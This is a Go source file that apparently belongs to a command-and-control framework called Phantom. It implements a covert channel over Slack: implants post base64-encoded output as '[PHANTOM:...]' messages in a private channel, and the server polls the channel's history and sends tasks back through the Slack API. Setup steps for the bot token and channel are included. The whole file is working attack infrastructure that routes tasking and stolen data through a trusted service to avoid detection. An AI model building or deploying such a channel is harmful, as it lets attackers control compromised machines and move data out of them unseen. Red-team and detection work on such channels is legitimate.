package exchannel

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// SlackChannel implements ExC2 over Slack webhooks and channel polling.
// Agents post base64-encoded payloads as Slack messages.
// The server polls a channel for new messages and delivers tasks via webhook.
//
// Setup:
//  1. Create a Slack app with bot token (xoxb-...)
//  2. Add bot to a private channel
//  3. Set SLACK_TOKEN and SLACK_CHANNEL_ID in server config or env
//
// Message format: [PHANTOM:<agentID>:<base64-payload>]
type SlackChannel struct {
	token      string
	channelID  string
	webhookURL string
	client     *http.Client
	running    bool
	lastTS     string // Slack message timestamp cursor
}

// NewSlackChannel creates a Slack ExC2 channel.
// token: Slack bot token (xoxb-...)
// channelID: Slack channel ID (C...)
// webhookURL: Slack incoming webhook URL (optional, for sending)
func NewSlackChannel(token, channelID, webhookURL string) *SlackChannel {
	return &SlackChannel{
		token:      token,
		channelID:  channelID,
		webhookURL: webhookURL,
		client:     &http.Client{Timeout: 15 * time.Second},
	}
}

func (s *SlackChannel) Name() string    { return "slack" }
func (s *SlackChannel) IsRunning() bool { return s.running }

func (s *SlackChannel) Start(ctx context.Context) error {
	s.running = true
	return nil
}

func (s *SlackChannel) Stop() error {
	s.running = false
	return nil
}

// Send posts a task payload to Slack as a base64-encoded message.
func (s *SlackChannel) Send(agentID string, payload []byte) error {
	encoded := base64.StdEncoding.EncodeToString(payload)
	msg := fmt.Sprintf("[PHANTOM:%s:%s]", agentID, encoded)

	body, _ := json.Marshal(map[string]string{
		"channel": s.channelID,
		"text":    msg,
	})

	req, err := http.NewRequest("POST", "https://slack.com/api/chat.postMessage", bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "Bearer "+s.token)
	req.Header.Set("Content-Type", "application/json")

	resp, err := s.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

// Recv polls the Slack channel for new messages from agents.
// Blocks until a Phantom message is found or context is cancelled.
func (s *SlackChannel) Recv(ctx context.Context) (string, []byte, error) {
	for {
		select {
		case <-ctx.Done():
			return "", nil, ctx.Err()
		default:
		}

		msgs, err := s.pollMessages()
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		for _, msg := range msgs {
			agentID, payload, ok := parsePhantomMessage(msg)
			if ok {
				return agentID, payload, nil
			}
		}

		time.Sleep(3 * time.Second)
	}
}

type slackHistoryResp struct {
	OK       bool `json:"ok"`
	Messages []struct {
		TS   string `json:"ts"`
		Text string `json:"text"`
	} `json:"messages"`
}

func (s *SlackChannel) pollMessages() ([]string, error) {
	url := fmt.Sprintf("https://slack.com/api/conversations.history?channel=%s&limit=10", s.channelID)
	if s.lastTS != "" {
		url += "&oldest=" + s.lastTS
	}

	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("Authorization", "Bearer "+s.token)

	resp, err := s.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var result slackHistoryResp
	if err := json.Unmarshal(body, &result); err != nil || !result.OK {
		return nil, fmt.Errorf("slack API error")
	}

	var texts []string
	for _, m := range result.Messages {
		texts = append(texts, m.Text)
		s.lastTS = m.TS
	}
	return texts, nil
}

// parsePhantomMessage extracts agentID and payload from [PHANTOM:<id>:<b64>] format.
func parsePhantomMessage(text string) (string, []byte, bool) {
	if !strings.HasPrefix(text, "[PHANTOM:") || !strings.HasSuffix(text, "]") {
		return "", nil, false
	}
	inner := text[9 : len(text)-1] // strip [PHANTOM: and ]
	parts := strings.SplitN(inner, ":", 2)
	if len(parts) != 2 {
		return "", nil, false
	}
	payload, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		return "", nil, false
	}
	return parts[0], payload, true
}
